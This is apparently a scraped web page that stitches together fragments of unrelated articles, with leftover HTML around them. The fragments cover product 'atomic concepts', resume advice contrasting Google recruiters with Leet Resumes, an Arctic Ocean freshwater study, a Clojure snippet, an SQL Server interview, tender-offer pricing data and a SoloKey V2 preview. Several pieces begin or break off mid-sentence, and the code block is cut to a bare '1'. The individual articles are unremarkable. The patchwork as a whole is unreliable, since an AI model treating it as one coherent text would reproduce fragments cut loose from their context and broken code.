<p>They choose the right atomic concepts.</p>



<p>These are the core concepts around which the entire product is built. They not only align with how customers think of their workflow, but often crystallizes for customers how they ought to. Great atomic concepts are honed and then extended and built upon in more complex compounds that…well for lack of a better word…<em>compound</em>.</p>



<p>Similar companies often have slightly different atomic concepts that end up making them meaningfully distinct. Photoshop is focused on pixels and images. Its focus is on editing images and pictures. And its functions operate by transforming them on a pixel level.</p>



<p>Illustrator is similar, but it operates on vectors, not pixels. This is a higher level abstraction. Neither is better or worse, they are just more suited to different use cases. Photoshop is better for modifying images, while illustrator is built for designs where scale-free vectors are best.</p>



<p>Sketch, like Illustrator, is vector based. But is designed for building digital products which means things like operating at a project level. It is not individual designs, but crafting entire products and user interfaces—and the needs for repeatability and consistency inherent to that.</p>



<p>Figma builds on Sketch’s approach, but also includes a greater focus on not just projects but the entire collaborative process as the relevant scope. Similarly, it also treats higher level abstractions like plugins, community, and more as equally important concepts.</p>



<p>Canva is similar to Photoshop and Illustrator, but its users aren’t designers who care about low level tools. Instead Canva’s core atomic concepts are around the different …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>Google technical recruiter Jeremy Ong and colleague Lizi Lopez created a <a href="https://www.youtube.com/watch?v=BYUy1yvjHxE">video</a> providing Google’s advice for resumes, both technical and non-technical. At Leet Resumes, we write <a href="https://leetresumes.com/">experienced engineers’ resumes for free</a>, so we thought we’d share and compare Google’s advice with our own, show where they mostly line up, and show where your resume needs to appeal to employers beyond Google. Given our focus, we’ll concentrate on how this advice applies to experienced technical or engineering professionals.</p><p>With three exceptions, the Google recruiters’ advice matches up with Leet Resumes’ advice, and I’ll explain why their advice is so very accurate, and also where we differ and why (the Google way is not everybody’s way). Further, we explain our design choices in detail in our <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation%C2%A0">documentation</a>.&nbsp;</p><p><img src="https://lh6.googleusercontent.com/41QpzF22JQx1YWrqtbdI56bA9Tp4VDHJlk6zX3z0Zk1T3PfU-chPyOcDFcCefMOOOIdxjJZOkOktgrpXBtUiitjiiluKsA7BSY0BeOOaccP_D8jWO6hndjFKtUOJDzUojsL0-dCp" alt="Google's resume advice"></p><p>First off, Jeremy and Lizi advise, “Make sure the format is simple and consistent in design, font, sizing, and spacing throughout so that the person reviewing your resume can easily scan and find information quickly.”</p><p>This sounds like obvious advice, but many engineers complicate their resumes with colors, columns, graphics, multiple fonts, font colors, and font sizes, that they put a tremendous burden on the people reading their resumes. Simple is better.</p><p><img src="https://lh4.googleusercontent.com/tv3HpXghtb62OxzGg0kDxdHB9icAzEmefiNvqiu-oRsy-rqXTshmq0a-Bn0L0Ll-mIf-Uxa1EYNyvVHmB2-m0UH-iw3_HaIh_9CNwBbJU-_LWRqK8tuKpdVWcX7Sw98F6Isrndrk" alt="Google's Resume Basics"></p><p>They continue, “Include your contact information and email at the top. You don't have to include objective statements [or] references. Use bullet points with consistent formatting and structure throughout the resume rather than long paragraphs.&nbsp;</p><p>“Keep your resume to… no longer than two pages for engineering roles. And perhaps the most important tip we have overall is to always check for typos.”</p><p>We agree with all of this advice at Leet. Bullet points and quick, scannable text are far superior to long paragraphs. It’s how readers ingest resumes in 2021.</p><p>On resume length, in our <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation%C2%A0">documentation</a>, we advise 1 page for those with 10 years’ or fewer experience, and 2 pages for those with 10 or more years of experience.</p><p>Typos might seem like a small matter, but many engineering managers have learned that engineers who aren’t careful with their resumes, also aren’t careful with their code. Be smart about it and check very carefully.</p><p><img src="https://lh3.googleusercontent.com/VFrSANgZ36uEfJ41lzjU8mNBtKwQW9i1lYqONH1QTq51yYw94r6TauDAjsjnJr2QPOZXPeiZTdrHRBrUcjR2NdBvusvD6rDQukbbOElz7FxaIiYwJaMRBtVMIPhZqDEK625_R2hs" alt="Google Resume Basics: Lengths"></p><p>Lizi and Jeremy continue, “It's also critical you list your GitHub profile or other prominent open source work that shows us you're contributing to the open source community, passionate about the work you're doing, and looking to improve your skills.”</p><p>We agree that your Github link should be in your contact information, and that your LinkedIn (which is a subset of your resume info, and therefore extraneous) should not be.</p><p>Jeremy and Lizi further comment that, “Experience should take up the bulk of your resume.”</p><p>Another obvious point, perhaps, but the most popular formats online, including those at the top of Google search results for software engineering resume template, break this good advice. These complex formats often push the experience section into as little as 25% of the available surface area of a resume. Again, simple is better.</p><p><img src="https://lh6.googleusercontent.com/P5XdrU6yP7ny6VNex_pCz7s3iuLbHuWZFfzvhB9of3mF_LKl9WN4jBKO7wuYoJ8wiMa8KHg8we-irDUWmE0EvBPPCAOZ471Dk7ITzqIttWRxc2n_4J-pZZk0FQcIWNxkXd3h5KVL" alt="Google Resume Advice: Experience"></p><p>The Google duo share: “List everything in reverse chronological order with your most recent experience first. Include your employer, position, and dates employed for all jobs… in the month-year format. Keep your bullet point descriptions concise and clear, and make the most of your space by streamlining bullet points that spill over onto the next line by only one or two words.”</p><p>Again, we agree and the resumes we write for experienced engineers follow these same guidelines. Concise and clear is usually a problem for engineers writing their own resumes, and that’s where Leet can be a big help in cutting out words, phrases, and even whole bullets that don’t advance your story.</p><p>“For each bullet, use action words like created, designed, debugged, negotiated, developed, managed, and so on, so the person reading your resume can easily and quickly understand your skills and experience.”</p><p>At Leet, we go further and suggest that you use success verbs - verbs that show how your work created successes - rather than simply using verbs such as managed or developed, which are more focused on duties and responsibilities instead of outcomes.&nbsp;</p><p><img src="https://lh3.googleusercontent.com/yXV2gqPytpBnWWAETYkNC0dIysQ4DTUjMzKtasBMyzvIlwAVR_aXM_EVUmNAcLNpXQFJZRlxihRFc91s9HK2o3Zg1exQ9cESP6hEzXFdIUrnSLrggUNPCi74z5QVMTcgJMnU1vHk" alt="null"></p><p>“It's important to focus on the results and impact of your work, so list metrics and examples concisely rather than writing long descriptions. We value data at Google and want to see you know how to apply it when speaking to your accomplishments. Use data and comparisons or averages to provide context.</p><p>“To ensure you focus on results and impact in this section, we recommend using this helpful framework – accomplished X as measured by Y by doing Z.”</p><p>Google is exactly right on this advice - use data, numbers, and metrics, to explain your results.

In this case, it's restructuring an API, but it could be an experience like adding new hardware, algorithmic improvements, caching answers, or implementing machine learning.”</p><p>Three cheers for Google on making this point so effectively.&nbsp; <a href="https://leetresumes.com/blog/why-you-should-include-numbers-on-your-technical-resume%C2%A0">Your technical resume should include numbers</a>.</p><p>A few more good points from the Google folks before we get into our disagreements.</p><p>“Include any relevant leadership positions, awards, university honors, scholarships, or other types of recognition.”</p><p>Remember, recognition indicates that someone else thought you were good, worthy, and successful. Including these external validations help show that your career progress is already endorsed by others - a good sign for a future boss.</p><p>And they also mention, “If you're applying for technical or engineering roles, be sure to include the programming language you used in bold for each project you include.”</p><p>This is advice unique to Google, and I feel more targeted towards junior engineers, for whom the particular language experience is important in hiring. The further you rise in your engineering career, the more the specifics of language choice and deployment fall away, and the bigger architectural issues come to predominate in any assessment of your capabilities.</p><p>Ok, so we’ve agreed with everything Google has to say, right? They’re flawless, right? Well, not quite. There are a few bits of advice that aren’t effective for candidates who are not applying to Google. Specifically:</p><p>“PDF formatting is preferred.”</p><p>As I’ve shared in my <a href="https://www.theladders.com/career-advice/resume-parser-ceos-advice-for-your-resume%C2%A0">mega-interview with the CEOs and technical experts at resume parsing</a> companies, PDFs can sometimes render in a graphical format that evade the comprehension of companies’ HR systems.&nbsp; MS Word, Google Docs, or even .txt should be preferred over PDF.&nbsp;</p><p><img src="https://lh6.googleusercontent.com/h_35s4QCEIIqyHzXasPCxCgdxtH55imC75BRzAa2zNi5pSD7NKiSp_JQA7smxG10Ollge5rr7Gibcckbo6ubCzspbUVqr91HCEq_fGKVRFGxFJsruYYUR66-xqy_2lEzwOoA3-SS" alt="null"></p><p>“List your programming languages at the top of your resume and make sure you're comfortable interviewing in them.”</p><p>In contrast to most other technical resume advice, Google suggests putting your programming languages at the top of your resume. I honestly don’t see how this advice can be realistic for most experienced programmers, and Leet Resumes places your technologies at the bottom of your resume.</p><p>To take just two examples, here are the technologies listed by two Leet Resumes users today:</p><p><u>Example 1</u></p><p><strong>Languages:</strong> Javascript, Typescript, HTML, CSS, SQL, Python, Java</p><p>Frameworks/Libraries: Express, NestJS, React, Redux, Cypress, Jest, Selenium, ReactNative, Node.js</p><p><strong>Database:</strong> PostgreSQL, MongoDB, TypeORM, Mongoose</p><p><strong>Certification:</strong> Certified Scrum Master</p><p><u>Example 2</u></p><p><strong>Languages:</strong> Python, Terraform, Java, JavaScript, SQL, HTML, Bash, CSS</p><p><strong>Tools:</strong> AWS Services, Git, Jenkins, Docker, Postgres, Camunda (BPM Engine), Gradle, Maven</p><p><strong>Libraries/Frameworks:</strong> SQLAlchemy, boto3, JUnit, Pytest, Spring/Spring Boot</p><p><strong>Other:</strong> Node.js, SocketCluster, REST APIs, Dreamfactory</p><p>It does not seem possible or realistic that either of these technology professionals could fit their technologies at the top of their resume without breaking the important formatting conventions that both Leet and Google advocate regarding placement of work experience and professional summary.</p><p>And finally, their advice to customize your resume per job simply isn’t accurate, “A big tip here is to read the job description and look at the language it uses. Writing a resume for a specific job description takes a little bit of effort, but it can really help your application stand out. You can even bold and italicize keywords related to the job description to highlight your relevant skills and experience.”</p><p>As with all users, there is a difference between what technical recruiters believe they do, and what they actually do. Given the amount of time spent in reviewing a resume, only the absolutely most relevant keywords are considered - perhaps 2 or 3, sometimes as many as 6.&nbsp; But never, ever dozens.&nbsp;&nbsp;</p><p>Your Leet resume will list all of the technologies in which you are proficient, and all of your major accomplishments. So if your well-constructed, thorough, thought-through resume doesn’t already have those 2-6 keywords on it, are you really a fit for the job?&nbsp;</p><p>It’s simply unlikely that your primary resume is truly missing a critical keyword that can be added to a secondary resume to catch a recruiter’s eye, and there is therefore no need to customize multiple resumes with keywords.</p><p>I hope you’ve enjoyed this review of the advice Google recruiters have for your technical resume. If you’d like Leet to <a href="https://leetresumes.com/">write your technical resume for free,</a> please sign up.&nbsp; You can also read the stories of other engineers - there’s a reason we can say users love us!</p></div></div></div></div>]]>

			<p><b>Scientists from Alfred Wegener Institute: “We need to have a fresh look at the role of the Arctic Ocean.”</b></p>
		

		<p><span>[03. February 2021]&nbsp;</span>
			
			
				<b><p>The Arctic Ocean was covered by up to 900 m thick shelf ice and was filled entirely with freshwater at least twice in the last 150,000 years. This surprising finding, reported in the latest issue of the journal Nature, is the result of long-term research by scientists from the Alfred Wegener Institute and the MARUM. With a detailed analysis of the composition of marine deposits, the scientists could demonstrate that the Arctic Ocean as well as the Nordic Seas did not contain sea-salt in at least two glacial periods. Instead, these oceans were filled with large amounts of freshwater under a thick ice sheet. This water could then be released into the North Atlantic in very short periods of time. Such sudden freshwater inputs could explain rapid climate oscillations for which no satisfying explanation had been previously found.</p></b>

			<p>About 60.000 to 70.000 years ago, in a particularly cold part of the last glacial period, large parts of Northern Europe and North America were covered by ice sheets. The European ice sheet spanned a distance of more than 5000 kilometres, from Ireland and Scotland via Scandinavia to the Eastern rim of the Kara Sea (Arctic Ocean). In North America, large parts of what is now known as Canada were buried under two large ice sheets. Greenland and parts of the Bering Sea coastline were glaciated too. What was the ice situation like even further North, in the Arctic Ocean? Was it covered by thick sea-ice, or maybe with the tongues of these vast ice sheets were floating on it, far beyond the North Pole?</p>
<p>Scientific answers to these questions were more or less hypothetical so far. In contrast to deposits on land, where erratic boulders, moraines and glacial valleys are the obvious landmarks of glaciers, only few traces of vast ice shelves had been found so far in the Arctic Ocean. Geoscientists from the Alfred Wegener Institute Helmholtz Centre for Polar and Marine Research (AWI) and MARUM Center for Marine Environmental Sciences at the University of Bremen have now compiled existing evidence from the Arctic Ocean and the Nordic Seas, and combined it with new data to arrive at a surprising conclusion.</p>
<p>According to their study, the floating parts of the northern ice sheets covered large parts of the Arctic Ocean in the past 150,000 years. Once about 70,000-60,000 years ago and also about 150,000-130,000 years ago. In both periods, freshwater accumulated under the ice, creating a completely fresh Arctic Ocean for thousands of years.</p>

			<p>“These results mean a real change to our understanding of the Arctic Ocean in glacial climates. To our knowledge, this is the first time that a complete freshening of the Arctic Ocean and the Nordic Seas has been considered - happening not just once, but twice,” says the first author, Dr Walter Geibert, geochemist at the Alfred Wegener Institute.</p>

			<h3><span>Thorium is absent in the sediments, so saline water must have been absent</span></h3>
<p>Their finding is based on geological analyses of ten sediment cores from different parts of the Arctic Ocean, Fram Strait and the Nordic Seas. The stacked deposits mirror the climate history of the past glacials. When investigating and comparing the sediment records, the geoscientists found that an important indicator was missing, always in the same two intervals. “In saline sea water, the decay of naturally occurring uranium always results in the production of the isotope thorium-230. This substance accumulates at the sea floor, where it remains detectable for a very long time due to its half-life of 75,000 years,” Walter Geibert explains.</p>
<p>Therefore, geologists often use this thorium-isotope as a natural clock. “Here, its repeated and wide-spread absence is the giveaway that reveals to us what happened. According to our knowledge, the only reasonable explanation for this pattern is that the Arctic Ocean was filled with freshwater twice in its younger history- in frozen and liquid form,” co-author and micropalaeontologist Dr Jutta Wollenburg, also from the AWI, explains. &nbsp;</p>

			<h3><span>A new picture of the Arctic Ocean</span></h3>
<p>How can a large ocean basin, connected by several straits with the North Atlantic and the Pacific Ocean, turn entirely fresh? “Such a scenario is perceivable if we realize that in glacial periods, global sea levels were up to 130 m lower than today, and ice masses in the Arctic may have restricted ocean circulation even further,” states co-author Professor Ruediger Stein, geologist at the AWI and the MARUM.</p>
<p>Shallow connections like Bering Strait or the sounds of the Canadian Archipelago were above sea level at the time, cutting off the connection with the Pacific Ocean entirely. In the Nordic Seas, large icebergs or ice sheets extending onto the sea floor restricted the exchange of water masses. The flow of glaciers, ice melt in summer, and rivers draining into the Arctic Ocean kept delivering large amounts of fresh water to the system, at least 1200 cubic kilometres per year. A part of this amount would have been forced via the Nordic Seas through the sparse narrow deeper connections in the Greenland-Scotland Ridge into the North Atlantic, hindering saline water from penetrating further north. This resulted in the freshening of the Arctic Ocean.</p>

			<p>“Once the mechanism of ice barriers failed, heavier saline water could fill the Arctic Ocean again,” Walter Geibert says. “We believe that it could then quickly displace the lighter freshwater, resulting in a sudden discharge of the accumulated amount of freshwater over the shallow southern boundary of the Nordic Seas, the Greenland-Scotland-Ridge, into the North Atlantic.”</p>
<p>A concept that assumes that enormous amounts of freshwater were stored in the Arctic Ocean and available for rapid release would help understanding the connection between a range of past climate fluctuations. It would also offer an explanation for some apparent discrepancies between different ways of reconstructing past sea levels. “The remains of coral reefs have pointed to a somewhat higher sea level in certain cold periods than reconstructions from Antarctic ice cores, or reconstructions from the calcareous shells of small marine organisms, would suggest,” explains Walter Geibert. “If we now accept that freshwater may not only have been stored in solid form on land, but some of it also in liquid form in the ocean, the different sea level reconstructions agree better and we can reconcile the location of the coral reefs with calculations of the freshwater budget.”</p>
<p>Freshwater release from the Arctic Ocean might also serve as an explanation for some abrupt climate change events during the last glacial period. &nbsp;During such events, temperatures in Greenland could rise by 8-10 degree centigrade within a few years, only returning to the original cold glacial temperatures over the course of hundreds or thousands of years. “We see an example here of a past Arctic climate tipping point of the Earth system. Now we need to investigate in more detail how these processes were interconnected, and evaluate how this new concept of the Arctic Ocean helps in closing further gaps in our knowledge, in particular in view of the risks of manmade climate change,” says Walter Geibert.</p>

So I decided to replace <code>interleave</code> with <code>map list</code>, since it gets us to where we need to be:</p><div><p><code><table><tbody><tr><td><pre>1

Instead of repeating <code>map</code> twice in <code>(map str (map first x))</code>, I replaced it with <code>(map (comp str first) x)</code> and it’s little bit cleaner:</p><div><p><code><table><tbody><tr><td><pre>1

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p><em><a href="https://brentozar.com/">Brent Ozar</a> is a SQL Server expert and Microsoft Certified Master who’s helped companies like Google and Stack Overflow get the most out of their SQL Servers.</em></p><p><em>We sat down (virtually) with Brent to talk about the future of Microsoft SQL Server, and the DBAs who’ve built their careers on it, in the new world of the cloud.</em></p><p><strong>Forrest Brazeal: Brent, you’re a performance specialist who’s worked with massive SQL Server deployments; how does it make you feel when you hear cloud architects saying things like&nbsp;“relational databases don’t scale?” What do you wish they knew?</strong></p><p>Brent Ozar: They’re right. Nothing scales worth a damn. Even stuff that looks easy, like Amazon S3 file storage, can run into scaling problems if you design it without an analysis of how AWS partitions reads,&nbsp;and how you have to watch out for your object prefixes.</p><p>But the thing is, nobody <a href="https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs">reads the documentation</a>.</p><p>Oh sure, they read page 1, they build the Hello World version, and then they start building an app without any regards whatsoever for how the design is gonna perform. (Sometimes, there’s not even a design – folks just start coding willy-nilly.)</p><p>So I kinda chuckle when I see folks say that something won’t scale – nothing will. It’s a poor musician that blames his instrument. Pick the persistence layer that you know the best, because that’s a hedge against you making dumb design decisions that will come back to haunt you later. The more mistakes you’ve made in the past with a tool, the more likely it is that you won’t make those mistakes again.</p><p>If you choose a persistence layer you’ve never used in production before, and your app becomes popular, you’re gonna be paying for the mistakes you made early on – or the mistakes the persistence layer made for you.</p><p><strong>So with that said, are there other reasons to choose SQL Server today, beyond “it’s what I already know?”</strong></p><p>When your application gets implemented at a 10,000-employee company, you start to get a lot more enterprise-sounding requests from different departments. For example, Sam from security needs to audit which users have changed data over the last 30 days, and Annabel from accounting needs your app to sync tax data with SAP.</p><p>In environments like this, it’s much more common to use Grandpa’s relational database because it’s already got a lot of built-in functionality to help accomplish these goals, and it’s easier to hire people off the street who know how to do it.</p><p>If you’re building a new web site or SaaS tool, and you’re going to be the only company that ever hosts it, then you have a lot of flexibility to choose the data persistence layer you want. You can use Database du Jour without problems. But if you wanna sell an app into 10,000-employee companies, you’re gonna get faster sales if you use a database they support.</p><p><strong>You’ve achieved such renown for your eponymous SQL Server helper tools that your name is sometimes&nbsp;<a href="https://www.linkedin.com/feed/update/urn:li:activity:6758016561585487872/" target="_blank" rel="noreferrer noopener">simply listed as a required skill on DBA job postings</a>. This is probably not a realistic goal for most of us. That said, what are a few career steps you recommend to become a trusted DBA?</strong></p><p>[Laughs] Yeah, that was surreal.</p><p>To become a trusted DBA – or a trusted anything – freely share what you know on a web site with your name on it.</p><p>Sharing knowledge accomplishes several different things. First, if a prospective boss or coworker Googles you, they’ll find your name, read what you wrote, and say, “Hey, this person really does seem to know stuff that I don’t know.” The dates on your blog posts also establish a track record of what you’ve known over time, and how it’s grown.</p><p>In the beginning, your goal is to be found if people Google your name. That’s fairly easy. Later on, as you start to accumulate more writings, people are also going to run across them when they Google for the subject matter, too, even without including your name. That’s when you’ll start building an audience – and people worry about that first, but hold off. Just start by building a public track record under your name, and the rest will start to snowball.&nbsp;</p><hr><p><em>If you’re looking to get skilled up on Azure, Microsoft is currently offering 50% off AZ-900 exam vouchers to anyone who completes <a href="https://acloudguru.com/course/az-900-microsoft-azure-fundamentals">ACG’s free prep course</a>!</em></p><hr><p><strong>AWS has recently announced an open-source translation tool called Babelfish, which is an aggressive attempt to get people off SQL Server and onto open-source database engines such as Postgres. What are your thoughts on this tactic?&nbsp;</strong></p><p>I adore Babelfish because it keeps the pressure on Microsoft to continue innovating.&nbsp;The database market is kinda like this:</p><ul><li>Oracle – massively expensive</li><li>Microsoft SQL Server – pretty doggone expensive</li><li>AWS RDS Postgres and Aurora – inexpensive to mildly expensive</li><li>Postgres – free to inexpensive, depending on support</li></ul><p>If you’re Microsoft, and you wanna make more money, you look at Oracle’s pile of cash, and you build features that will help Oracle users migrate down to SQL Server and save money. If you’re AWS, you look at Microsoft’s pile of cash, and you build features like Babelfish that will help SQL Server users migrate down and save money. Everything slowly becomes a less expensive commodity. (If this kind of thing interests you, search for <a href="https://acloudguru.com/course/wardley-mapping">Wardley value mapping</a> – it’s really neat stuff.)</p><p>I’m really excited about AWS Babelfish because it encourages Microsoft to start defending their value proposition. Microsoft has to start&nbsp;shipping new stuff that makes AWS RDS &amp; Aurora customers aspire to using the Real Deal SQL Server (and/or Azure SQL DB).</p><p>SQL Server 2017 &amp; 2019 started bringing that with query optimizer improvements such that your code will just run faster – that’s a good down payment, but they gotta keep making those payments. If they don’t, projects like Babelfish will start to win over customers if/when they ship.</p><p><strong>SQL Server on Linux: smart play by MSFT, or failed experiment?</strong></p><p>If you go down the list of popular databases, the only ones that are Windows-only are SQL Server and Access. I think it made sense for Microsoft to hedge their bets and start making the investments necessary to survive in datacenters 10-20-30 years from now. It’s a hedge, though: it shouldn’t be your first default choice for running SQL Server. The full feature capability isn’t there, and the high availability &amp; disaster&nbsp;recovery story is still pretty sketchy.</p><p>I think of SQL Server 2019 on Linux as an alpha release. It’s there if you&nbsp;<em>have</em>&nbsp;to have it, but otherwise, you should wait for a few years until you really need it. Right now, it’s just kinda there for experiments.</p><p>The one place where you might&nbsp;<em>have</em>&nbsp;to have it is throwaway environments for continuous integration. If you need to quickly and inexpensively stand up and shut down a lot of temporary SQL Servers to test your code, then sure, it makes sense there.&nbsp;&nbsp;</p><p><strong>What’s the future of SQL Server in the cloud, anyway? Is it the next Oracle (as AWS is trying to position it), widely disliked and mostly legacy, or can it compete with managed OSS engines like Postgres and MySQL on its own terms?&nbsp;</strong></p><p>Don’t think about the dislike &amp; legacy in terms of the name brand of the database engine.</p><p>Think about dislike &amp; legacy in terms of the&nbsp;<em>features</em>&nbsp;that have to be implemented: auditing, fine-grained single sign on security, integration with Active Directory, compatibility with reporting systems, GDPR compliance, encryption, etc. Here’s a great place to start:&nbsp;<a href="https://www.enterpriseready.io/">https://www.enterpriseready.io</a></p><p>Developers HATE those features. That’s why Amazon and others say that Oracle and SQL Server are disliked, legacy applications: they support all the features that enterprise users demand, but developers hate. I hate those features too, but…enterprises demand ’em.</p><p>If you’re not in an enterprise, and you don’t have plans to sell your app to an enterprise, then don’t use an expensive relational database. Use something cheaper and cloud-native like Amazon’s touting. I agree that it’s a better choice.</p><p><strong>Finally, what does a DBA role look like in, say, 2025?&nbsp;</strong></p><p>2025 is just four short years from now, and most orgs still aren’t even&nbsp;<em>planning</em>&nbsp;for a cloud-native future. They’re just talking about it. The DBA job description in 2025 will still look the same as it looks today: managing data stored in a bunch of diverse platforms, all of which have their own management, troubleshooting, and performance tuning.</p><p>If you stretch it out to 2031 or 2036, 10-15 years from now, it’ll be easier. We’ll have less worries around backups, corruption repair, and restores. But you know what we’ll still be dealing with? Troubleshooting (because everybody assumes it’s a database problem first), security, encryption, performance tuning, and architecture.</p><p>The cloud doesn’t architect itself.</p><p><em>This interview is part of ACG’s <a href="https://acloudguru.com/blog/tag/cloud-conversations">Cloud Conversations</a> series.</em></p></div></div></div>]]>

As companies head towards the public markets, particularly those planning a direct listing, tender offers also provide valuable guidance on what their stock is worth. The problem with tender offers is that they underprice a company’s stock, sometimes drastically.&nbsp;</p><img src="https://images.prismic.io/sacra/2c6189f7-515e-45c3-8b3d-78f893ca7973_image3.png?auto=compress,format"><p><em>Tender offers serve the vital purpose of providing a scalable route to liquidity for employees at fast-growing companies.</em></p><p>In late 2019, Asana employees sold stock¹ into a tender offer priced at $15.82. Less than a year later, the company would go public at $28 a share.&nbsp;</p><p>In February 2020, Snowflake employees sold² into a tender at $38.77 per share—in September, the company would go public and hit $253 on its first day of trading.</p><p>Tender offers promise to help employees of private high-growth companies de-risk and diversify, but chronic underpricing means that selling into a tender frequently means leaving large sums of money on the table.&nbsp;</p><img src="https://images.prismic.io/sacra/5d6bdc9a-4bc9-4948-b344-727a46af656b_image8.png?auto=compress,format"><p><em>In July 2019, Unity employees sold</em>³<em> into a tender priced below their contemporaneous Series E round. 16 months later, the stock’s value would be up 400%.</em></p><p>Today, we’re seeing low participation rates of 37% across tender offers and 83% of all transactions priced at or under the price of the last round of funding.</p><p>We analyzed a data set of 64 tender offers totaling more than $3B in transaction volume. We found that not only are employees still the “last to liquidity”, they still need to go to the public markets to get competitive pricing on their stock.</p><div>

    <h2 id="how-83--of-tender-offers-get-priced-at-or-under-the-price-of-the-last-round">How 83% of tender offers get priced at or under the price of the last round</h2><p>For investors, tender offers can help win deals and get a larger percentage of ownership than they could otherwise—and, in the vast majority of cases, they can do so at or below the price of the last round of funding.</p><img src="https://images.prismic.io/sacra/e06d41b2-2506-44c9-88b1-82b15a722176_image5.png?auto=compress,format"><p><em>Most tender offers are priced at a 1:1 ratio with the price of the last round. 83% are priced at 1:1 or under. (Aggregated and anonymized data from Carta)</em></p><p>We’re seeing tender offers priced at the price of the last round or lower in 83% of all transactions, with 15% priced at a 20% premium or better and less than one half of one percent at a 2x premium or better. The ratio clusters at 1:1 with the price of the last round.</p><p>Pricing tender offers based on the last round’s valuation is convenient, but it misprices high-growth companies. By relying on the last round’s valuation, all new growth and changes to the company’s fundamentals are not priced in, and employees and other shareholders end up selling at a discount.</p><img src="https://images.prismic.io/sacra/0741f5ae-8b93-4e97-b9ca-2760524a5c20_image6.png?auto=compress,format"><p><em>Pricing tenders offers based on the last round of fundraising underprices companies in proportion to their growth and progress.</em></p><p>To assess the degree to which underpricing is prevalent in tender offers, we compared the discount or premium on the price of the last round for each tender offer with a linearly interpolated price based on the amount of time passed since the round (“price of tender with perfect liquidity” in the graph above). We found nearly every tender offer in our dataset to be significantly underpriced, with a large majority underpriced by more than 10%.</p><img src="https://images.prismic.io/sacra/f5b1729c-8c8d-4a87-bf57-663d8dbaf34d_image4.png?auto=compress,format"><p><em>Across the data set, nearly every tender offer was significantly underpriced relative to where the Company traded in a future financing round. (Based on Carta data)</em></p><p>Every year, that’s hundreds of millions of dollars being transferred from shareholders to the investors on the buy-side of these tender offers. Rather than a mechanism to help employees de-risk and diversify, the tender offer has become a way for investors to extract shares at cut-rate prices from those employees most desperate for liquidity.</p><h2 id="why-participation-in-tender-offers-is-under-40-">Why participation in tender offers is under 40%</h2><p>Underpricing doesn’t just hurt employees by reducing their overall returns from selling into tender offers. It also dampens participation rates—calculated as the portion of shares sold into a tender by a stakeholder divided by the portion of shares eligible for sale—keeping employees from getting liquidity.&nbsp;</p><img src="https://images.prismic.io/sacra/507bfd16-2341-4089-afae-617f93fa4bbf_image1.png?auto=compress,format"><p><em>Less underpriced tender offers see higher participation rates (i.e. employees selling a higher percentage of the shares they are eligible to sell into that tender), while more underpriced tenders see less participation. (Based on Carta data)</em></p><p>When we look at the data, there appears to be a direct relationship between tender offer underpricing and what percentage of their eligible holdings employees opted to sell. For the most part, tender offers that were less than 30% underpriced saw participation rates of between 30% and 50%, while tenders more severely underpriced saw their participation fall to between 10% and 30%.</p><p>The upshot of underpricing in tender offers was not just low employee participation, but low prices for employees selling stock compared to founders and investors selling stock in private secondary transactions apart from tender offers. When we looked at all secondary sales, including one-off and founder sales, we found that employees sold at significantly lower prices than founders and investors.</p><img src="https://images.prismic.io/sacra/29198a4e-c911-40b2-8cbd-4b519c48bcc3_image7.png?auto=compress,format"><p><em>Across all secondary sales, investors and founders were more likely to be able to sell at a price closer to the price of the last round. (Based on Carta data)</em></p><p>All secondary sales tend to be at or under the last round’s price, but founders and investors were more likely to sell at a 1:1 ratio to the price of the last round, while employees were more likely to sell at a discount.&nbsp;These subpar outcomes may help explain why only 24% of employees ever exercise their options⁴.</p><h2 id="employees-are-the-last-to-liquidity--while-investors-are-the-first">Employees are the last to liquidity, while investors are the first</h2><p>Across all secondaries, employees account for fewer transactions than founders and investors until companies hit $310M in post-money valuation. Founders and early investors sell from seed to Series B, while employee sales become more significant from Series C onward.</p><img src="https://images.prismic.io/sacra/a02368be-cbf8-41bc-9740-6c59ed211fb0_image2.png?auto=compress,format"><p><em>Over time, participation in secondary sales flips from primary investor-centric to primarily employee-centric. (Based on Carta data)</em></p><p>We analyzed the selling stakeholders in tender offer transactions across 28 post-money valuation buckets. Overall, investor sales made up an average of 50% of transactions, founder sales made up 15%, and employee sales made up just 33%. The brunt of investor sales come early. At post-money valuations up to $21M, investors are responsible for more than 70% of secondary transactions, while founders and employees sell in roughly equal amounts.&nbsp;</p><p>Meanwhile, 75% of all employee transactions take place once a company’s post-money valuation has exceeded $160M. In contrast, just 46% of investor transactions and 41% of founder transactions take place after that point.</p><p>This distribution of secondary activity reflects the reality that as equity has become more liquid, the benefits of that liquidity have accrued to investors, founders, and employees in that order. Investors have the ability to sell early, when a company’s stock is still exclusive. Employees, meanwhile, have to wait until the stock is more broadly available—and commands a smaller premium.</p><h2 id="how-to-fix-the-tender-offer">How to fix the tender offer</h2><p>The state of liquidity has come a long way since the days when VCs would never agree to shareholders taking money off the table. Founders and angels in particular have much better access to one-off secondary sales to de-risk themselves and their portfolios. But as companies stay private longer and longer and look to provide liquidity to their early employees, the tender offers they use to do so at scale still leave much to be desired.</p><p>At the core of the problem is a lack of liquidity in the market for secondary shares itself. In almost all cases, tender offers are closed-door transactions with a buyer who is an existing investor and major stakeholder with control rights and a board seat.</p><p>For tender pricing to become responsive to the real value of companies, information about companies would need to be released and external investors would need to be invited into the process. With better information and investor access and up-to-date tender pricing, founders, angels, and most of all, employees at high growth private companies would benefit.</p><div>

                  <h2 id="this-is-a-short-preview-of-the-new-solokey-v2-hardware-revision">This is a short preview of the new SoloKey V2 hardware revision.</h2>
<h4 id="lets-check-it-out">Let’s check it out!</h4>

<p>Some history…</p>
<pre><code>I had bought the original Solokey (The USB-A version and the USB-C TAP version) on their first Kickstarter campaign, as i was pretty enthusiastic about the "opensource security key idea"
and i wanted to test the NFC part of the solokey with my mobile devices. 

For the most part the original Solokey worked as expected.
But unfortunately the NFC part of the Solokey had some issue's with my Oneplus Phone and my iPhone. 
The devices most of the time could not connect via NFC with the Solokey, making it unusable in those "mobile situations". 

I opened up an issue on their Github page, and soon ohters were claiming that they had the same issue. The Solokey team picked up on this, and eventually started to work on a new version of the Solokey.
</code></pre>
